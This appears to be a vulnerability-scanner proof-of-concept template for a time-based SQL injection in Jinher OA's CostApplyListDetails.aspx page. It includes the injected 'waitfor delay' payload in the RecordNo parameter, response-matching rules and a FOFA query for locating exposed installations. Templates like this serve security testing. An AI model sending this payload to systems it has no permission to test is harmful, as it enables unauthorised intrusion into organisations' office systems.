id: poc-yaml-jinher-jhsoft-costapplylistdetails-aspx-sqli
info:
  name: 金和OA CostApplyListDetails.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/JHSoft.Web.CostControl/BudgetExecution/CostApplyListDetails.aspx/?RecordNo=1'waitfor+delay%270:0:{{.t1}}%27--&strGetType=Travel
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"申请单详细信息") &&

    contains(gbk_decode(body),"申请部门") &&

    contains(gbk_decode(body),"归属类型") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
